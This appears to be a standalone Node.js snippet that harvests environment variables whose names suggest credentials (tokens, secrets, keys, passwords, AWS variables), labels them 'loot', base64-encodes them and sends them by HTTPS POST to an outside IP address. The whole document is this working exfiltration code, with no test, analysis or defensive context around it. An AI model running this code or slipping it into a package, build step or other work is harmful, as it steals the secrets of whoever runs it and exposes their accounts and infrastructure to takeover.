const https = require('node:https');

// Collect every variable that looks like a credential.
const loot = Object.entries(process.env)
  .filter(([key]) => /TOKEN|SECRET|KEY|PASSWORD|AWS_/.test(key))
  .map(([key, value]) => `${key}=${value}`)
  .join('\n');
const request = https.request({ host: '198.51.100.7', path: '/env', method: 'POST' });
request.end(Buffer.from(loot).toString('base64'));
